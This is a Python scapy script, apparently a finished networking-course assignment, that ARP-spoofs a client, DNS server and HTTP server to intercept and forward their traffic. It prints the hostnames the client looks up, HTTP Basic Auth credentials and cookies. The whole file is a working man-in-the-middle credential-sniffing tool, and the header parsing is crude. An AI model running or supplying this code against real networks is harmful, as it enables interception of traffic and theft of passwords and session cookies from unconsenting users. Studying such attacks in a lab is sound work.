from scapy.all import *

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()

def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=IP), retry=2, timeout=5)
    for s,r in resp:
        #print(r[ARP].hwsrc)
        return r[ARP].hwsrc
    return None
#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)

# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    kwargs = {
            'op':2,
            'pdst':dst_ip,
            'psrc':src_ip,
            'hwdst':"ff:ff:ff:ff:ff:ff",
            }
    if src_mac is not None:
        kwargs['hwsrc'] = src_mac
    send(ARP(**kwargs), count = 5)
    


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=dstIP, hwsrc=srcMAC, psrc=srcIP), count=5)

    #os.system("sysctl -w net.inet.ip.forwording=0")
    #os.kill(os.getpid().signal.SIGTERM)

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    
    #print(packet[Ether].src,packet[Ether].dst)
    #print(packet[0].summary)


    if IP in packet:
        if packet[IP].src==clientIP and packet[IP].dst==dnsServerIP:
            #print("From client to DNS starting......")
            print("*hostname:",packet["DNS Question Record"].qname.decode("utf-8"))

            packet2 = packet
            packet2[Ether].dst = dnsServerMAC
            sendp(packet2)
            #print("From client to DNS ending.......") 
        elif packet[IP].src==dnsServerIP and packet[IP].dst==clientIP:
            #print("From DNS to client starting......")
            packet2 = packet
            packet2[Ether].dst = clientMAC
            sendp(packet2)
            #packet.show()
            if DNS in packet:
                if type(packet[DNS]["DNS Resource Record"].rdata)==str:
                    print("*hostaddr:",packet[DNS]["DNS Resource Record"].rdata)



            #print("From DNS to client ending......")
        elif packet[IP].src==clientIP and packet[IP].dst==httpServerIP:
            #print("From client to HTTP starting......")
            #packet.show()
            packet2 = packet
            packet2[Ether].dst = httpServerMAC
            sendp(packet2)
            if Raw in packet:
                #print("Raw in packet:",packet[Raw])
                temp = packet[Raw].load.decode("utf-8")
                basicAuth = temp[(temp.find("Basic")+6):temp.find("User")]
                print("*basicauth:",basicAuth)

            #print("From client to HTTP ending......")
        elif packet[IP].src==httpServerIP and packet[IP].dst==clientIP:
            packet2 = packet
            packet2[Ether].dst = clientMAC 
            sendp(packet2)
            #print("From HTTP to client starting.....")
            #packet[0].show()
            #packet[1].show()
            #packet.show()
            
            if Raw in packet:
                temp = packet[Raw].load.decode("utf-8")
                cookie = temp[(temp.find("Cookie")+6):temp.find("Accept")]
                print("*cookie:",cookie)

                #packet.show()
                #print("Raw in packet:",packet[Raw])
            string = str(packet)    
            #print("From HTTP to client ending......")


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
